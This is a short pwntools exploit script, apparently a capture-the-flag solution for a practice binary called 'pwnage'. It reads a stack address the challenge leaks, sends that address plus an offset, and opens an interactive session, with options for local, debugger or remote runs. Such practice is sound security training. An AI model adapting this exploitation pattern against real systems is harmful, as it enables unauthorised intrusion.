
from pwn import *

exe = './pwnage' # only REMOTE Challenge
 
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: # ['server', 'port']
        return remote(sys.argv[1], sys.argv[2], *a, **kw) 
    else:
        return process([exe] + argv, *a, **kw)
 
gdbscript = '''
b *main+133
b check_flag
continue
'''.format(**locals())

io = start()

io.recvuntil(b"hint, the address of the current stackframe I'm\nin is ") 
stack_addr = int(io.recvline().strip().decode(),16)
print(hex(stack_addr))
io.sendline( hex(stack_addr+0x20) )
io.recvuntil(b"disconnect you\nGood luck!\n")
print(io.recvline())

io.interactive()